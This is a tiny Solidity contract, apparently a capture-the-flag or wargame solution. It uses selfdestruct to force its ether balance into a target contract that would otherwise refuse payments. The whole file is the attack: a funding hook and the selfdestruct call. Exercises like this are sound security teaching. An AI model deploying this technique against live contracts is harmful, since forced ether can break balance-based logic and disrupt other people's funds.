// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    function attack(address _forceAddr) external {
        selfdestruct(payable(_forceAddr));
    }
    receive() external payable {}
}